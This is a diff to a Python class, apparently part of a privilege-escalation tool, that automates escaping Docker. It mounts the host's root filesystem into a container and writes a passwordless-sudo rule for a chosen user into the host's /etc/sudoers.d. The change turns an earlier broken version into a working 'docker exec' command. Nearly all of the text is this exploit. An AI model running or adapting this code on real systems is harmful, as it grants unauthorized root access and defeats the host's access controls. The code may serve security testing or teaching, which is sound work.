@@ -9,7 +9,7 @@ WORKDIR $WORKDIR""",
          }
 
 class HostWrite:
-    def __init__(self, trigger_time=0, workdir="privesc", image="priv_container", container="ESCAPE_PRIVESC", username="testuser"):
+    def __init__(self, trigger_time=5, workdir="privesc", image="priv_container", container="ESCAPE_PRIVESC", username="testuser"):
         self.trigger_time = trigger_time
         self.workdir = workdir
         self.image = image
@@ -25,12 +25,12 @@ class HostWrite:
         subprocess.run(["docker", "build", "-t", image, "."])
     
     def trigger_in(self, in_sec=0, kill_in_sec=0):
-        time.sleep(in_sec)
-        subprocess.run(["docker", "run", "--name", self.container, "-v", "/:/{}".format(self.workdir), "-it", self.image, "/bin/sh"])
-        time.sleep(self.trigger_time)
-        subprocess.run(["echo", '"{}'.format(self.username), 'ALL=(ALL)', 'NOPASSWD:',  'ALL"',  ">", "/{}/etc/sudoers.d/010_{}-nopasswd".format(self.workdir, self.username)])
-        time.sleep(kill_in_sec)
-        subprocess.run(["exit"])
+        # time.sleep(in_sec)
+        subprocess.run('docker run --name {} -v /:/{} -dit {} /bin/sh'.format(self.container, self.workdir, self.image).split())
+        # time.sleep(self.trigger_time)
+        
+        subprocess.run(['docker', 'exec', self.container, 'sh', '-c', 'echo "{} ALL=(ALL) NOPASSWD: ALL" > /{}/etc/sudoers.d/010_{}-nopasswd'.format(self.username, self.workdir, self.username)])
+        # time.sleep(kill_in_sec)
 
     def cleanup(self, in_sec=0):
         time.sleep(in_sec=0)
